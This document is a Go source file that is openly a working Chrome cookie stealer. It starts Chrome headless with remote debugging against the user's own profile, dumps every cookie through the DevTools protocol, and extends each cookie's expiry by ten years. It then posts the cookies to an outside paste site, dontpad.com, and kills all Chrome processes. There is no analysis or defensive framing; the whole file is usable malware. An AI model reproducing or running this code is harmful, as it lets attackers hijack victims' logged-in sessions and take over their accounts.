package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"time"

	"golang.org/x/net/websocket"
)

// DebugData is JSON structure returned by Chromium
type DebugData struct {
	Description          string `json:"description"`
	DevtoolsFrontendURL  string `json:"devtoolsFrontendUrl"`
	FaviconURL           string `json:"faviconUrl"`
	ID                   string `json:"id"`
	Title                string `json:"title"`
	PageType             string `json:"type"`
	URL                  string `json:"url"`
	WebSocketDebuggerURL string `json:"webSocketDebuggerUrl"`
}

// WebsocketResponseRoot is the raw response from Chromium websocket
type WebsocketResponseRoot struct {
	ID     int                     `json:"id"`
	Result WebsocketResponseNested `json:"result"`
}

// WebsocketResponseNested is the object within the the raw response from Chromium websocket
type WebsocketResponseNested struct {
	Cookies []Cookie `json:"cookies"`
}

// Cookie is JSON structure returned by Chromium websocket
type Cookie struct {
	Name     string  `json:"name"`
	Value    string  `json:"value"`
	Domain   string  `json:"domain"`
	Path     string  `json:"path"`
	Expires  float64 `json:"expires"`
	Size     int     `json:"size"`
	HTTPOnly bool    `json:"httpOnly"`
	Secure   bool    `json:"secure"`
	Session  bool    `json:"session"`
	SameSite string  `json:"sameSite"`
	Priority string  `json:"priority"`
}

// LightCookie is a JSON structure for the cookie with only the name, value, domain, path, and (modified) expires fields
type LightCookie struct {
	Name    string  `json:"name"`
	Value   string  `json:"value"`
	Domain  string  `json:"domain"`
	Path    string  `json:"path"`
	Expires float64 `json:"expirationDate"`
}

func GetDebugData(debugPort string) []DebugData {

	// Create debugURL from user input
	var debugURL = "http://localhost:" + debugPort + "/json"

	// Make GET request
	resp, err := http.Get(debugURL)
	if err != nil {
		log.Fatalln(err)
	}

	// Read GET response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	// Unmarshal JSON response
	var debugList []DebugData
	err = json.Unmarshal(body, &debugList)
	if err != nil {
		log.Fatalln(err)
	}

	return debugList
}

// DumpCookies interacts with the webSocketDebuggerUrl to obtain Chromium cookies
func DumpCookies(debugList []DebugData) {

	// Obtain WebSocketDebuggerURL from DebugData list
	var websocketURL = debugList[0].WebSocketDebuggerURL

	// Connect to websocket
	ws, err := websocket.Dial(websocketURL, "", "http://localhost/")
	if err != nil {
		log.Fatal(err)
	}

	// Send message to websocket
	var message = "{\"id\": 1, \"method\":\"Network.getAllCookies\"}"
	websocket.Message.Send(ws, message)

	// Get cookies from websocket
	var rawResponse []byte
	websocket.Message.Receive(ws, &rawResponse)

	// Unmarshal JSON response
	var websocketResponseRoot WebsocketResponseRoot
	err = json.Unmarshal(rawResponse, &websocketResponseRoot)
	if err != nil {
		log.Fatalln(err)
	}
	lightCookieList := []LightCookie{}

	for _, value := range websocketResponseRoot.Result.Cookies {
		// Turns Cookie into LightCookie with modified expires field
		var lightCookie LightCookie

		lightCookie.Name = value.Name
		lightCookie.Value = value.Value
		lightCookie.Domain = value.Domain
		lightCookie.Path = value.Path
		lightCookie.Expires = (float64)(time.Now().Unix() + (10 * 365 * 24 * 60 * 60))
		lightCookieList = append(lightCookieList, lightCookie)
	}

	lightCookieJSON, err := json.Marshal(lightCookieList)
	if err != nil {
		log.Fatalln(err)
	}
	//fmt.Printf("%s\n", lightCookieJSON)
	//f, err := os.Create("cookies.json")
	//if err != nil {
	//	log.Fatalln(err)
	//}
	//defer f.Close()
	//_, err2 := f.WriteString(string(lightCookieJSON))
	//if err2 != nil {
	//	log.Fatal(err2)
	//}
	SendJson(string(lightCookieJSON))
}

func SendJson(cookies string) {
	fullurl := "http://dontpad.com/cstealrca"
	resp, err := http.PostForm(fullurl, url.Values{
		"text": {cookies}})
	if err != nil {
		log.Fatal(err)
	}
	fmt.Print(resp.Body)
}

func StartProcess() {
	user, err := user.Current()
	if err != nil {
		log.Println(err)
	}
	cmd := exec.Command("powershell.exe", "-c", `Start-Process "chrome.exe" -ArgumentList '--remote-debugging-port=9999 --headless --user-data-dir="`+user.HomeDir+`\AppData\Local\Google\Chrome\User Data"'`)
	if err := cmd.Run(); err != nil {
		log.Println("Error:", err)
	}
}

func TerminateProcess() {
	cmd := exec.Command("powershell.exe", "-c", `Get-Process "chrome" | Stop-Process`)
	if err := cmd.Run(); err != nil {
		log.Println("Error:", err)
	}
}

func main() {

	var debugPort string = "9999"

	StartProcess()

	debugList := GetDebugData(debugPort)
	DumpCookies(debugList)

	TerminateProcess()
	os.Exit(0)
}
